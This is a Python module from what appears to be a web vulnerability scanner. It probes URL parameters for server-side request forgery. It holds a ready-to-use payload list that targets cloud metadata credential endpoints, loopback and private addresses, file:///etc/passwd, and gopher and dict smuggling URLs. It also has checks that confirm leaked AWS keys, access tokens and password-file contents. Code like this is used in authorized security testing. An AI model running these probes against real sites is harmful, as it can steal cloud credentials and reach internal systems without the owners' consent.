"""GECKO APOCALYPSE - SSRF Prober (Cloud metadata, internal network, protocol smuggling)"""
import asyncio, aiohttp, re, hashlib
from typing import List, Dict, Optional
from urllib.parse import urlparse, parse_qs, urlencode

class SSRFProber:
    def __init__(self, session, config, db):
        self.session = session; self.config = config; self.db = db
        self.targets = [
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
            'http://localhost/', 'http://127.0.0.1/', 'http://[::1]/',
            'http://0177.0.0.1/', 'http://0x7f000001/',
            'http://192.168.0.1/', 'http://10.0.0.1/',
            'file:///etc/passwd', 'file:///c:/windows/win.ini',
            'gopher://127.0.0.1:25/_MAIL', 'dict://127.0.0.1:11211/stat',
        ]

    async def scan(self, url, content, headers, response):
        findings = []
        for p in self._find_url_params(url, content):
            for t in self.targets:
                r = await self._test(url, p, t)
                if r: findings.append(r); break
        return findings

    def _find_url_params(self, url, content):
        params = list(parse_qs(urlparse(url).query).keys())
        kw = ['url','uri','path','dest','redirect','link','src','source','callback','return','page','site','target','next','goto','file']
        return [p for p in params if any(k in p.lower() for k in kw)]

    async def _test(self, url, param, target):
        parsed = urlparse(url); params = parse_qs(parsed.query)
        params[param] = [target]
        test_url = parsed._replace(query=urlencode(params, doseq=True)).geturl()
        try:
            async with self.session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as r:
                c = await r.text(errors='ignore')
                if self._verify(target, c, r):
                    sev = 'CRITICAL' if '169.254' in target or 'metadata' in target else ('HIGH' if 'file://' in target else 'MEDIUM')
                    return {'type':'Server-Side Request Forgery (SSRF)','severity':sev,'url':url,
                            'parameter':param,'payload':target,'evidence':c[:200],
                            'remediation':'Validate URLs, whitelist domains, block internal IPs',
                            'cwe':'CWE-918','owasp':'A10:2021 - SSRF'}
        except: pass

    def _verify(self, target, content, resp):
        if '169.254.169.254' in target:
            return any(x in content for x in ['ami-id','instance-id','AccessKeyId','security-credentials'])
        if 'metadata.google.internal' in target:
            return 'access_token' in content or 'email' in content
        if 'metadata/instance' in target:
            return 'compute' in content or 'access_token' in content
        if 'file://' in target:
            return 'root:x:0:0' in content or '[extensions]' in content
        if any(x in target for x in ['localhost','127.0.0.1','192.168','10.']):
            return len(content) > 100
        return False
